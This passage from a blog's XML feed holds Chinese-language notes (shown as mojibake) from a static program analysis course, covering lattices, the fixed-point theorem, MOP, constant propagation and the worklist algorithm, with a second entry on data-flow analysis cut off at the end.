Framework via Lattice</h1><p>ä¸€ä¸ªæ•°æ®æµåˆ†ææ¡†æ¶å¯ä»¥è¡¨ç¤ºä¸ºä¸€ä¸ªä¸‰å…ƒç»„$(D,L,F)$ ï¼Œå…¶ä¸­ï¼š</p><ul><li>Dï¼šæŒ‡æ•°æ®æµåˆ†æçš„æ–¹å‘ï¼Œi.e., forward or backwardï¼›</li><li>Lï¼šæŒ‡latticeï¼Œè¯¥æ ¼è¡¨ç¤ºæ‰€æœ‰domainå€¼åŸŸï¼Œä»¥åŠmeetï¼ˆ$\sqcap$ï¼‰æˆ–joinï¼ˆ$\sqcup$ï¼‰æ“ä½œï¼›</li><li>Fï¼šä¸€ç»„transfer functionã€‚</li></ul><h1 id="Monotonicity-and-Fixed-Point-Theorem"><a href="#Monotonicity-and-Fixed-Point-Theorem" class="headerlink" title="Monotonicity and Fixed Point Theorem"></a>Monotonicity and Fixed Point Theorem</h1><h2 id="Monotonicityï¼ˆå•è°ƒæ€§ï¼‰"><a href="#Monotonicityï¼ˆå•è°ƒæ€§ï¼‰" class="headerlink" title="Monotonicityï¼ˆå•è°ƒæ€§ï¼‰"></a>Monotonicityï¼ˆå•è°ƒæ€§ï¼‰</h2><blockquote><p>A function $f: Lâ†’L$ ($L$ is a lattice) is monotonic if $âˆ€x,yâˆˆL$,  $xâŠ‘yâŸ¹f(x)âŠ‘f(y)$</p></blockquote><p>æ™®é€šå‡½æ•°çš„å•è°ƒæ€§çš„æ¨å¹¿</p><h2 id="Fixed-Point-Theorem"><a href="#Fixed-Point-Theorem" class="headerlink" title="Fixed-Point Theorem"></a>Fixed-Point Theorem</h2><blockquote><p>Given a complete lattice ($L,âŠ‘$), if (1) $f:Lâ†’L$ is monotonic and (2) $L$ is finite, then the <strong>least fixed point</strong> of $f$ can be found by iterating $f(âŠ¥), f(f(âŠ¥)), \dots, f^k(âŠ¥)$ until a fixed point is reached the greatest fixed point of $f$ can be found by iterating $f(\top),f(f(\top)),\dots, f^k(\top)$ until a fixed point is reached.</p></blockquote><p>å¦‚æœfå•è°ƒä¸”Læœ‰ç•Œï¼Œé‚£ä¹ˆfå­˜åœ¨ä¸åŠ¨ç‚¹ï¼Œä»$âŠ¥$å¼€å§‹è¿­ä»£æ‰§è¡Œ$f$å¯å¾—æœ€å°ä¸åŠ¨ç‚¹ï¼Œä»$\top$å¼€å§‹è¿­ä»£å¯å¾—æœ€å¤§ä¸åŠ¨ç‚¹ã€‚</p><p>è¯æ˜ï¼š<br>(1) Existence<br>ç”±$\perp$å®šä¹‰ä»¥åŠ$f:L\rightarrow L$å¯å¾—</p><script type="math/tex; mode=display">\perp \sqsubseteq f(\perp)</script><p>åˆå› $f$æ˜¯å•è°ƒçš„ï¼Œå› æ­¤</p><script type="math/tex; mode=display">f(\perp) \sqsubseteq f(f(\perp))=f^2(\perp)</script><p>ç”±äºLæ˜¯æœ‰é™(finite)çš„ï¼Œå› æ­¤æ€»ä¼šå­˜åœ¨ä¸€ä¸ªkï¼Œæœ‰</p><script type="math/tex; mode=display">f^{Fix}=f^k(\perp)=f^{k+1}(\perp)</script><p>ï¼ˆ2ï¼‰Least Fixed Pointï¼ˆæ•°å½’æ³•ï¼Œè¯æ˜æœ€å°ï¼‰</p><p>å‡è®¾æˆ‘ä»¬æœ‰å¦ä¸€ä¸ªä¸åŠ¨ç‚¹xï¼Œi.e., $x=f(x)$</p><p>ç”±$\perp$çš„å®šä¹‰ï¼Œæˆ‘ä»¬æœ‰$\perp \sqsubseteq x$;</p><p>ä¸‹é¢ç”¨æ•°å½’æ³•è¯æ˜ï¼š</p><p>ç”±äº $f$ æ˜¯å•è°ƒçš„ï¼Œå› æ­¤</p><script type="math/tex; mode=display">f(\perp) \sqsubseteq f(x)</script><p>å¯¹äº$f^i(\perp)\sqsubseteq f^i(x)$ï¼Œç”±äº $f$ æ˜¯å•è°ƒçš„ï¼Œå› æ­¤æˆ‘ä»¬æœ‰</p><script type="math/tex; mode=display">f^{i+1}(\perp)\sqsubseteq f^{i+1}(x)</script><p>å› æ­¤å¯¹äºä»»æ„iï¼Œæœ‰</p><script type="math/tex; mode=display">f^i(\perp)\sqsubseteq f^i(x)</script><p>åˆå› ä¸º$x=f(x)$ï¼Œæ‰€ä»¥å­˜åœ¨ä¸€ä¸ªiï¼Œæœ‰$f^i(\perp)\sqsubseteq f^i(x)=x$ï¼Œå› æ­¤æœ‰</p><script type="math/tex; mode=display">f^{Fix} = f^k(\perp) \sqsubseteq x</script><p>å› æ­¤$f^i(\perp)$ æ˜¯æœ€å°ä¸åŠ¨ç‚¹ã€‚</p><h1 id="Relate-lterative-Algorithm-to-Fixed-Point-Theorem"><a href="#Relate-lterative-Algorithm-to-Fixed-Point-Theorem" class="headerlink" title="Relate lterative Algorithm to Fixed Point Theorem"></a>Relate lterative Algorithm to Fixed Point Theorem</h1><p>å¦‚ä½•å°†è¿­ä»£ç®—æ³•å’Œä¸åŠ¨ç‚¹å®šç†è”ç³»èµ·æ¥ï¼Ÿ</p><ol><li>ç¨‹åºä¸­æ¯ä¸€ä¸ªçŠ¶æ€ä¸ºä¸€ä¸ªproduct lattice</li><li>Transfer functionå’Œjoin/meet fucntionå¯ä»¥è§†ä¸ºF</li></ol><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæ•°æ®æµåˆ†æ-ç†è®ºåŸºç¡€ï¼‰/image-20200812205336289.png" alt="image-20200812205336289"></p><p>ä¸‹é¢åªéœ€è¦è¯æ˜Transfer functionå’Œ join/meet functionå‡ä¸ºå•è°ƒçš„å³å¯</p><ol><li><p>Transfer functionæ˜¯å•è°ƒçš„ï¼Œå› ä¸ºé€šè¿‡ä¹‹å‰åˆ†æï¼Œæ‰€æœ‰Gen/Killçš„å‡½æ•°éƒ½æ˜¯å•è°ƒçš„ï¼›</p></li><li><p>Join/meet functionæ˜¯å•è°ƒçš„ï¼Œè¯æ˜å¦‚ä¸‹</p><p>è¦è¯Join/meet functionï¼Œå°±æ˜¯è¦è¯$\forall x, y, z \in L, x \sqsubseteq y \Rightarrow x\sqcup z \sqsubseteq y \sqcup z$</p><p>ç”± $\sqcup$ å®šä¹‰å¯å¾—ï¼Œ$y \sqsubseteq y \sqcup z$ï¼Œ</p><p>ç”±äº$\sqsubseteq$ä¼ é€’æ€§ï¼Œ$x \sqsubseteq y$ï¼Œå› æ­¤$x \sqsubseteq y \sqcup z$ï¼Œå› æ­¤ $y \sqcup z$ æ˜¯ $x$ çš„ä¸Šç•Œï¼Œ</p><p>æ³¨æ„åˆ° $y \sqcup z$ ä¹Ÿæ˜¯ $z$ çš„ä¸Šç•Œï¼Œè€Œ$x\sqcup z$ æ˜¯ $x$ å’Œ $z$ çš„æœ€å°ä¸Šç•Œï¼Œ</p><p>å› æ­¤ $ x \sqsubseteq y \Rightarrow x\sqcup z \sqsubseteq y \sqcup z$</p></li></ol><p><strong>è®¨è®ºç®—æ³•å¤æ‚åº¦</strong></p><p>å®šä¹‰æ ¼çš„é«˜åº¦å³ä»topè‡³bottomçš„æœ€é•¿è·¯å¾„é•¿ï¼Œ</p><blockquote><p>The height of a lattice $h$ is the length of the longest path from Top to Bottom in the lattice.</p></blockquote><p>æœ€åæƒ…å†µå³ä¸€æ¬¡è¿­ä»£ï¼Œåªå˜åŒ–ä¸€ä¸ªå•ä½é«˜åº¦ï¼Œå› æ­¤å¤æ‚åº¦ä¸º$O(h \times k)$.</p><h1 id="May-Must-Analysis-A-Lattice-View"><a href="#May-Must-Analysis-A-Lattice-View" class="headerlink" title="May/Must Analysis, A Lattice View*"></a>May/Must Analysis, A Lattice View*</h1><p>ä»»ä½•åˆ†æåˆå§‹çŠ¶æ€éƒ½ä»unsafeè‡³safeã€‚</p><p>ä¸ªäººå¯¹safeå’Œunsafeçš„ç†è§£ï¼šé’ˆå¯¹äºåˆ†æç»“æœè€Œè¨€ï¼Œå¤„ç†æ‰€æœ‰åˆ†æç»“æœåï¼Œç¨‹åºè¡Œä¸ºæ­£å¸¸ä¸ºsafeï¼Œåä¹‹ä¸ºunsafeï¼Œæç«¯çš„safeæ˜¯æ— ç”¨çš„ï¼ˆå¦‚å®‰å…¨æ‰«æä¸­çš„æ¨¡å¼åŒ¹é…ï¼‰<br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæ•°æ®æµåˆ†æ-ç†è®ºåŸºç¡€ï¼‰/image-20200812214731510.png" alt="image-20200812214731510"></p><p>Mustå’ŒMayåˆ†æçš„ç¤ºæ„å›¾å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œå¯¹äºMuståˆ†æï¼Œæ¯ä¸ªä»£ç å—éƒ½æ˜¯ä» $\top$ å¼€å§‹çš„ï¼Œå› ä¸ºåœ¨ç¨‹åºä¸€å¼€å§‹ï¼Œç®—æ³•è®¤ä¸ºæ‰€æœ‰çš„å¾…åˆ†æå¯¹è±¡éƒ½æ˜¯â€œåˆæ ¼â€çš„ï¼ˆä¾‹å¦‚å­˜æ´»è¡¨è¾¾å¼åˆ†æä¸­ï¼Œç®—æ³•è®¤ä¸ºæ¯ä¸ªè¡¨è¾¾å¼éƒ½æ˜¯æˆæ´»çš„ï¼‰â€”â€”è¿™æ˜¯ä¸€ä¸ªä¸å®‰å…¨çš„çŠ¶æ€ï¼Œç»è¿‡ä¸æ–­è¿­ä»£ï¼Œç®—æ³•é€æ¸ä¸‹é™åˆ°æœ€å¤§ä¸åŠ¨ç‚¹ï¼Œè™½ç„¶å·²ç»è¿‡äº†truthç‚¹ï¼ˆæ¼æŠ¥ï¼‰ï¼Œä½†æ˜¯è¿™å·²ç»æ˜¯æœ€å¥½æƒ…å†µäº†ï¼ˆè¶Šå¾€ä¸‹èµ°è¶Šsafeä½†æ˜¯ç»“æœä¹Ÿæ²¡æ„ä¹‰äº†ï¼‰ï¼Œå¯¹è¿™äº›ç»“æœåšä¼˜åŒ–èƒ½ç¡®ä¿ç¨‹åºä¸å‡ºé”™ï¼ˆsafeï¼‰ã€‚</p><p>å¯¹äºMayåˆ†æï¼Œæ¯ä¸ªä»£ç å—ä» $\perp$ å¼€å§‹ï¼Œå³åœ¨ä¸€å¼€å§‹ï¼Œç®—æ³•è®¤ä¸ºæ‰€æœ‰åˆ†æå¯¹è±¡éƒ½æ˜¯ä¸åˆæ ¼çš„ï¼ˆä¾‹å¦‚å®šä¹‰å¯è¾¾æ€§åˆ†æä¸­ï¼Œç®—æ³•è®¤ä¸ºæ¯ä¸€æ¡å®šä¹‰éƒ½æ²¡æœ‰æ–°çš„å®šä¹‰ï¼‰â€”â€”è¿™æ˜¯Mayç±»å‹çš„ä¸å®‰å…¨çŠ¶æ€ï¼Œç»è¿‡ä¸æ–­è¿­ä»£ï¼Œç®—æ³•é€æ¸ä¸Šå‡åˆ°æœ€å°ä¸åŠ¨ç‚¹ï¼ŒåŒæ ·ä¹Ÿè¿‡äº†truthï¼ˆè¯¯æŠ¥ï¼‰ï¼Œè¿™ä¹Ÿæ˜¯åˆ†æçš„æœ€å¥½æƒ…å†µï¼Œç®—æ³•ä¾æ—§åœç•™åœ¨safeåŒºåŸŸã€‚</p><h1 id="Distributivityï¼ˆåˆ†é…æ€§ï¼‰-and-MOP"><a href="#Distributivityï¼ˆåˆ†é…æ€§ï¼‰-and-MOP" class="headerlink" title="Distributivityï¼ˆåˆ†é…æ€§ï¼‰ and MOP"></a>Distributivityï¼ˆåˆ†é…æ€§ï¼‰ and MOP</h1><h2 id="MOPï¼ˆMeet-Over-All-Paths-Solutionï¼‰"><a href="#MOPï¼ˆMeet-Over-All-Paths-Solutionï¼‰" class="headerlink" title="MOPï¼ˆMeet-Over-All-Paths Solutionï¼‰"></a>MOPï¼ˆMeet-Over-All-Paths Solutionï¼‰</h2><p>è®¾ $s_x$ ä¸ºæ¯ä¸€ä¸ªstatmentsï¼Œè®¾ $F_p$ æ˜¯ä¸€ä¸ªè·¯å¾„ $P$ ä¸Šçš„ transfer functionï¼Œé‚£ä¹ˆ$MOP[S_i]=\sqcup/\sqcap_{\text{A path }P\text{ from Entry to }S_{i}} F_p(OUT[Entry])$.</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæ•°æ®æµåˆ†æ-ç†è®ºåŸºç¡€ï¼‰/image-20200814215920162.png" alt="image-20200814215920162"></p><p>å°±æ˜¯è¯´ï¼Œä¹‹å‰æ•°æ®æµåˆ†æçš„ç»“æœæ˜¯<strong>æµæ•æ„Ÿ</strong>çš„ï¼Œè€Œ MOP çš„ç»“æœæ˜¯è·¯å¾„æ•æ„Ÿçš„ï¼Œ</p><p>ä¾‹å¦‚ä¸‹å›¾æ‰€ç¤ºçš„æ•°æ®æµï¼Œæ•°æ®æµåˆ†æçš„ç»“æœæ˜¯ $\mathrm{IN}\left[\mathrm{s}_{4}\right]=f_{s_{3}}\left(f_{s_{1}}(\mathrm{OUT}[ entry ]) \sqcup f_{S_{2}}( OUT [ Entry ])\right)$ï¼Œè€ŒMOPæ˜¯ $ \mathrm{MOP}\left[\mathrm{s}_{4}\right]=f_{S_{3}}\left(f_{s_{1}}(\mathrm{OUT}[ entry ])\right) \sqcup f_{S_{3}}\left(f_{S_{2}}(\mathrm{OUT}[ Entry ])\right)$ï¼ˆæ³¨æ„$f_{s_3}$çš„ä½ç½®ï¼‰</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæ•°æ®æµåˆ†æ-ç†è®ºåŸºç¡€ï¼‰/image-20200814220329588.png" alt="image-20200814220329588" style="zoom:50%;"></p><h2 id="Iterative-Algorithm-v-s-MOP"><a href="#Iterative-Algorithm-v-s-MOP" class="headerlink" title="Iterative Algorithm v.s. MOP"></a>Iterative Algorithm v.s. MOP</h2><p>MOPæ¯”Iterativeåˆ†ææ›´ç²¾ç¡®ï¼Œä¹Ÿå°±æ˜¯è¯´è·¯å¾„æ•æ„Ÿæ¯”æ•æ„Ÿæ›´ç²¾ç¡®ï¼Œä¸‹é¢ä¸ºè¯æ˜ï¼ˆè¿™é‡Œåªéœ€è¯æ˜ä¸¤æ¡è·¯å¾„çš„æƒ…å†µï¼Œå…¶å®ƒæ•°å½’å³å¯ï¼‰ï¼š</p><p>ç”± $\sqcup$ çš„å®šä¹‰å¾— $\mathrm{x} \sqsubseteq \mathrm{x} \sqcup \mathrm{y}$ ä¸” $\mathrm{y} \sqsubseteq \mathrm{x} \sqcup \mathrm{y}$ï¼›</p><p>å› ä¸º $F$ æ˜¯å•è°ƒçš„ï¼Œå› æ­¤æœ‰ $F(x) \sqsubseteq F(x \sqcup y)$ ä¸” $F(y) \sqsubseteq F(x \sqcup y)$ï¼›</p><p>å› æ­¤$F(x\sqcup y)$ æ˜¯ $F(x)$ å’Œ $F(y)$ çš„ä¸Šç•Œï¼›</p><p>åˆå› ä¸º$F(x)\sqcup F(y)$æ˜¯ $F(x)$ å’Œ $F(y)$ çš„æœ€å°ä¸Šç•Œï¼›</p><p>å› æ­¤ $ F(x) \sqcup F(y) \sqsubseteq F(x\sqcup y)$ï¼Œå³$MOP \sqsubseteq Ours$ã€‚</p><p>ç„¶è€Œï¼Œå½“Fæ˜¯distributiveï¼ˆFæ»¡è¶³åˆ†é…ç‡ï¼‰æ—¶ï¼ŒInterativeå’ŒMOPä¸€æ ·å‡†ç¡®ã€‚</p><p>BitVectoræˆ–æ˜¯Gen/Killé—®é¢˜ï¼ˆset union/intersection for join/meetï¼‰éƒ½æ˜¯æ»¡è¶³åˆ†é…ç‡çš„</p><h1 id="Constant-Propagation"><a href="#Constant-Propagation" class="headerlink" title="Constant Propagation"></a>Constant Propagation</h1><blockquote><p>Given a variable $x$ at program point p, determine whether $x$ is guaranteed to hold a constant value at $p$</p></blockquote><p>å¯¹äºåœ¨ç¨‹åºç‚¹ $p$ çš„ä¸€ä¸ªå˜é‡ $x$ï¼Œåˆ¤æ–­ $x$ æ˜¯å¦ä¸ºåœ¨ $p$ ç‚¹ä¸ºä¸€ä¸ªå¸¸é‡</p><p>åˆ†æç»“æœï¼šå¯¹äºæ¯ä¸€ä¸ªCFGèŠ‚ç‚¹ï¼Œå¯¹åº”ä¸€ä¸ª $(x,v)$ é›†åˆï¼Œ$x$ æ˜¯å˜é‡ï¼Œ$v$ æ˜¯ $x$ çš„å€¼</p><h2 id="Lattice"><a href="#Lattice" class="headerlink" title="Lattice"></a>Lattice</h2><p>Domainï¼š UNDEF â†’ {â€¦, -2, -1, 0, 1, 2, â€¦} â†’ NAC ï¼Œâ†’ è¡¨ç¤º $\sqsubseteq$ å…³ç³»</p><p>Meet Operator $\sqcap$ï¼š</p><ul><li>$\mathrm{NAC} \sqcap v= \mathrm{NAC}$</li><li>$\mathrm{UNDEF} \sqcap v= v$</li><li>$c \sqcap v= \mathrm{NAC}$ ï¼ˆc ä¸ºä¸€å¸¸é‡ï¼‰</li><li>$c \sqcap c= c$</li><li>$c_1 \sqcap c_2 = \mathrm{NAC}$</li></ul><h2 id="Transfer-Function"><a href="#Transfer-Function" class="headerlink" title="Transfer Function"></a>Transfer Function</h2><p>è®¨è®ºtransfer functionï¼Œå¯¹äºä¸€ä¸ªèµ‹å€¼è¯­å¥ <code>s: x= ...</code> æ¥è¯´ï¼Œå®šä¹‰å…¶ F ä¸º</p><script type="math/tex; mode=display">F: \mathrm{OUT}[s]=gen \cup(\mathrm{IN}[s]-\{(x, \_)\})</script><ul><li><code>s: x=c;</code>  $gen=\{(x,c)\}$</li><li><code>s: x=y;</code> $gen=\{(x, val(y))\}$</li><li><code>s: x=y op z;</code> $gen=\{(x, f(x,z))\}$ </li></ul><p>è€Œ $f(x,z)$ æœ‰ä¸‰ç§æƒ…å†µï¼š</p><script type="math/tex; mode=display">f(y,z)=\left\{\begin{array}{ll} val(y) \text { op } val(z) & \text {// if val(y) and val(z) are constants } \\ \text { NAC } & \text {//if val(y) or val(z) is NAC } \\\text { UNDEF } & \text {// otherwise } \\\end{array}\right.</script><h2 id="functionä¸æ»¡è¶³åˆ†é…æ€§"><a href="#functionä¸æ»¡è¶³åˆ†é…æ€§" class="headerlink" title="functionä¸æ»¡è¶³åˆ†é…æ€§"></a>functionä¸æ»¡è¶³åˆ†é…æ€§</h2><p>å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œ$F(X\sqcap Y)$ ä¸­Cçš„å€¼ä¸º<strong>NAC</strong>ï¼Œè€Œ$F(X) \sqcap F(Y)$ä¸­ C çš„å€¼ä¸º<strong>10</strong>ï¼Œå› æ­¤Fä¸æ»¡è¶³åˆ†é…æ€§ã€‚</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæ•°æ®æµåˆ†æ-ç†è®ºåŸºç¡€ï¼‰/image-20200815173321586.png" alt="image-20200815173321586"></p><h1 id="Worklist-Algorithm"><a href="#Worklist-Algorithm" class="headerlink" title="Worklist Algorithm"></a>Worklist Algorithm</h1><p>Iterative Algorithmçš„ä¼˜åŒ–ï¼ŒIterative å­˜åœ¨å†—ä½™çš„è®¡ç®—ï¼Œè€ŒWorkliståªè®¡ç®—æœ‰å˜åŒ–çš„nodeï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">OUT[entry] =âˆ…;</span><br><span class="line"><span class="keyword">for</span>(each basic block B\entry) </span><br><span class="line">OUT[B] =âˆ…;</span><br><span class="line">    Worklistâ†all basic blocks</span><br><span class="line"><span class="keyword">while</span> (Worklist <span class="keyword">is</span> notempty) </span><br><span class="line">    Pick a basic block B <span class="keyword">from</span> Worklist</span><br><span class="line">old_OUT= OUT[B]</span><br><span class="line">        IN[B] =âŠ”OUT[P]; <span class="comment"># join/meet Pä¸ºBçš„å‰ç½®ä»£ç å—</span></span><br><span class="line">        OUT[B] = genB U (IN[B] - killB); <span class="comment"># transfer function </span></span><br><span class="line">        <span class="keyword">if</span>(old_OUTâ‰ OUT[B])</span><br><span class="line">        Add all successors of B to Worklis</span><br></pre></td></tr></table></figure><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>æœ¬èŠ‚è¯¾ä¸»è¦ä»‹ç»æ ¼ï¼Œæ¥ç€ç”¨æ ¼æŠ½è±¡æè¿°æ•°æ®æµåˆ†æï¼Œè§£é‡Šä¸ºä»€ä¹ˆè¿­ä»£ç®—æ³•èƒ½å¤Ÿåˆ°è¾¾æœ€å¤§/æœ€å°ä¸åŠ¨ç‚¹ï¼Œæ¥ç€æ¯”è¾ƒäº†æµæ•æ„Ÿå’Œè·¯å¾„æ•æ„Ÿçš„å‡†ç¡®æ€§ï¼Œæœ€åä»‹ç»worklistç®—æ³•ï¼Œä»¥æå‡è¿­ä»£ç®—æ³•çš„æ•ˆç‡ã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Iterative-Algorithm&quot;&gt;&lt;a href=&quot;#Iterative-Algorithm&quot; class=&quot;headerlink&quot; title=&quot;Iterative Algorithm&quot;&gt;&lt;/a&gt;Iterative Algorithm&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;å¯¹äºä¸€ä¸ªå« $k$ ä¸ªèŠ‚ç‚¹çš„CFGï¼Œæ¯ä¸ªè¿­ä»£ç®—æ³•å¯¹äºæ¯ä¸ªnode $n$ æ›´æ–°$\mathrm{OUT}[n]$ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;å‡è®¾è¿­ä»£ç®—æ³•çš„ç ”ç©¶å¯¹è±¡ï¼ˆdomainï¼‰æ˜¯$V$ï¼Œå®šä¹‰ä¸€ä¸ªkå…ƒç»„$V^k=\left(\mathrm{OUT}\left[\mathrm{n}_{1}\right], \mathrm{OUT}\left[\mathrm{n}_{2}\right], \ldots, \mathrm{OUT}\left[\mathrm{n}_{\mathrm{k}}\right]\right)$ï¼Œ$V^k\in(V_1 \times V_2 \times \dots \times V_k)$ï¼Œ$V^k$ å³ä¸€æ¬¡è¿­ä»£äº§ç”Ÿçš„è¾“å‡ºï¼Œæ¯æ¬¡è¿­ä»£ä¼šæ›´æ–°$V^k$ï¼Œå¯ä»¥å°†æ¯æ¬¡è¿­ä»£ç»è¿‡transfer functionså’Œcontrol-flow handingçš„è¿‡ç¨‹æŠ½è±¡ä¸º$F: V^k\rightarrow {V^{k}}â€™$&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;å½“$V^k\rightarrow {V^{k}}â€™$æ—¶ï¼Œå³$X=F(X)$ ï¼Œç§°$F(x)$åœ¨$X$å¤„åˆ°è¾¾äº†&lt;strong&gt;ä¸åŠ¨ç‚¹&lt;/strong&gt;ï¼Œ$X$ä¸º$F(x)$çš„ä¸åŠ¨ç‚¹ï¼Œ&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="Program Language" scheme="http://anemone.top/categories/Program-Language/"/>
    
    
      <category term="ç™½ç›’æ‰«æ" scheme="http://anemone.top/tags/%E7%99%BD%E7%9B%92%E6%89%AB%E6%8F%8F/"/>
    
      <category term="é™æ€ç¨‹åºåˆ†æ" scheme="http://anemone.top/tags/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/"/>
    
      <category term="æ•°æ®æµåˆ†æ" scheme="http://anemone.top/tags/%E6%95%B0%E6%8D%AE%E6%B5%81%E5%88%86%E6%9E%90/"/>
    
      <category term="PL" scheme="http://anemone.top/tags/PL/"/>
    
  </entry>
  
  <entry>
    <title>é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæ•°æ®æµåˆ†æ-åº”ç”¨ï¼‰</title>
    <link href="http://anemone.top/pl-%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0%EF%BC%88%E6%95%B0%E6%8D%AE%E6%B5%81%E5%88%86%E6%9E%90-%E5%BA%94%E7%94%A8%EF%BC%89/"/>
    <id>http://anemone.top/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæ•°æ®æµåˆ†æ-åº”ç”¨ï¼‰/</id>
    <published>2020-08-02T09:34:13.000Z</published>
    <updated>2020-08-15T09:54:31.368Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Overview-amp-Preliminaries"><a href="#Overview-amp-Preliminaries" class="headerlink" title="Overview &amp;  Preliminaries"></a>Overview &amp;  Preliminaries</h1><p>ä¸¤ç±»åˆ†æï¼š</p><ul><li><p>may Analysisï¼šover-approximation</p></li><li><p>must Analysisï¼šunder-approximation</p></li></ul><p>å®é™…ä¸Šéƒ½æ˜¯ä¸ºäº†safety of analysisã€‚</p><h2 id="å¯¹æ•°æ®æµåˆ†æçš„å‡ ç§è§£é‡Š"><a href="#å¯¹æ•°æ®æµåˆ†æçš„å‡ ç§è§£é‡Š" class="headerlink" title="å¯¹æ•°æ®æµåˆ†æçš„å‡ ç§è§£é‡Š"></a>å¯¹æ•°æ®æµåˆ†æçš„å‡ ç§è§£é‡Š</h2><a id="more"></a><p>è§£é‡Šä¸€ï¼š</p><blockquote><p>An analysis to figure out â€œhow <strong>application-specific Data</strong> Flows through the <strong>Nodes(BBs/statements)</strong> and <strong>Edges(control flows) </strong>of CFG(a program)?â€</p></blockquote><p>å¯¹äºapplication-specific dataï¼Œç”±å¯¹å˜é‡æˆ–è¡¨è¾¾å¼<strong>æŠ½è±¡ï¼ˆAbstractionï¼‰</strong>è¡¨ç¤ºï¼›å¯¹äºNodesï¼Œç”±<strong>Transfer function</strong>å¤„ç†ï¼›å¯¹äºEdgesï¼Œæœ‰<strong>Control-flow handing</strong>å¤„ç†ã€‚</p><p>Abstractionã€Transfer functionå’ŒControl-flow handingæ˜¯è®¾è®¡ä¸€ä¸ªæ•°æ®æµåˆ†æçš„ä¸‰ä¸ªå…³é”®è¦ç´ ã€‚</p><p>è§£é‡ŠäºŒï¼š</p><blockquote><p>In each data-flow analysis application, we associate with every program point a data-flow value that represents an abstraction of the set of all possible program states that can be observed for that point.</p></blockquote><p>æ§åˆ¶æµåˆ†æå³ç»™å‡ºæ¯ä¸€ä¸ªç¨‹åºç‚¹ä¸€ä¸ªæ§åˆ¶æµçš„å€¼ï¼Œè¯¥å€¼æ˜¯è¡¨ç¤ºåœ¨è¯¥ç‚¹èƒ½åˆ†æåˆ°çš„æ‰€æœ‰å¯èƒ½ç»“æœçš„æŠ½è±¡è¡¨ç¤ºã€‚</p><p>è§£é‡Šä¸‰ï¼š</p><blockquote><p>Data-flow analysis is to find a solution to a set of safe-approximation-directed constraints on the IN[s]â€™s and OUT[s]â€™s, for all statements $s$.</p></blockquote><p>æ§åˆ¶æµåˆ†æå³åœ¨safe-approximationè§„åˆ™ï¼ˆmay or mastï¼‰çº¦æŸä¸‹ï¼Œè§£å‡ºæ¯ä¸€ä¸ªstatementsçš„INå’ŒOUTã€‚</p><p>è¿™é‡Œçš„INå’ŒOUTæŒ‡æ¯ä¸€ä¸ªè¯­å¥çš„è¾“å…¥å’Œè¾“å‡ºã€‚</p><p>è¿™é‡Œçš„çº¦æŸåŒ…å«äº†è¯­ä¹‰ï¼ˆè½¬æ¢å‡½æ•°ï¼‰å’Œæ§åˆ¶æµä¿¡æ¯ï¼ˆControl-flow Handingï¼‰ã€‚</p><h2 id="è½¬æ¢å‡½æ•°ï¼ˆtransfer-functionï¼‰"><a href="#è½¬æ¢å‡½æ•°ï¼ˆtransfer-functionï¼‰" class="headerlink" title="è½¬æ¢å‡½æ•°ï¼ˆtransfer functionï¼‰"></a>è½¬æ¢å‡½æ•°ï¼ˆtransfer functionï¼‰</h2><p>åˆ†æå•ä¸ªBBçš„å‡½æ•°ï¼Œå­˜åœ¨å‰å‘åˆ†æå’Œåå‘åˆ†æï¼š</p><ul><li><p>å‰å‘åˆ†æï¼ˆForward Analysisï¼‰<br>$Out[s]=f_s(IN[s])$</p></li><li><p>åå‘åˆ†æï¼ˆBackward Analysisï¼‰ï¼Œå°†CFGåå‘ç­‰äºForward<br>$In[s]=f_s(OUT[s])$</p></li></ul><h2 id="æ§åˆ¶æµä¿¡æ¯å¤„ç†ï¼ˆControl-flow-Handlingï¼‰"><a href="#æ§åˆ¶æµä¿¡æ¯å¤„ç†ï¼ˆControl-flow-Handlingï¼‰" class="headerlink" title="æ§åˆ¶æµä¿¡æ¯å¤„ç†ï¼ˆControl-flow Handlingï¼‰"></a>æ§åˆ¶æµä¿¡æ¯å¤„ç†ï¼ˆControl-flow Handlingï¼‰</h2><p>å®šä¹‰æ•°æ®æµåœ¨BBsé—´çš„æµåŠ¨æ–¹å¼ï¼Œæ§åˆ¶æµä¸­çš„BBså­˜åœ¨ä¸‰ç§æƒ…å†µï¼š</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæ•°æ®æµåˆ†æ-åº”ç”¨ï¼‰/image-20200802175052488.png" alt="image-20200802175052488"></p><p>åä¸¤ç§æƒ…å†µå­˜åœ¨meetæ“ä½œï¼ˆç¬¬äºŒç§åå‘åˆ†æå­˜åœ¨ï¼‰</p><p><img 